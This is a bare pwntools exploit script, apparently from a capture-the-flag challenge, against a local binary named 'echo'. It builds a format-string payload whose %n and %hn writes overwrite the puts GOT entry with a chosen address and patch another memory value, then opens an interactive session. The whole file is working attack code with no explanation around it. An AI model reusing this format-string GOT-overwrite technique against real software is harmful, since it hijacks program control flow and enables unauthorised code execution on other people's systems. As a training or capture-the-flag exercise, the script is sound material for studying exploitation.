from pwn import *

context.log_level = 'DEBUG'

def pad(s):
    return s+"\x90"*(256-len(s)-32)


p = process('./echo', env = {'LD_LIBRARY_PATH':'.'})

puts_got = 0x0000000000603030

id_addr  = 0x0000000000603218

target   = 0x401dd6

payload  = "BBBBCCCC"
payload += "%" + str(0x0040 - len(payload)) + "x"
payload += "%34$n"
payload += "%" + str(0x1DD6 - 0x0040) + "x"
payload += "%35$hn"
payload += "%" + str(0x87E2 - 0x1DD6) + "x"
payload += "%36$hn"
payload += "%" + str(0xBD8C - 0x87E2) + "x"
payload += "%37$n"

payload  = pad(payload) 
payload += p64(puts_got+2)
payload += p64(puts_got)
payload += p64(id_addr)
payload += p64(id_addr+2)

p.recvuntil("...")
p.send(payload)
p.recv()
p.interactive()
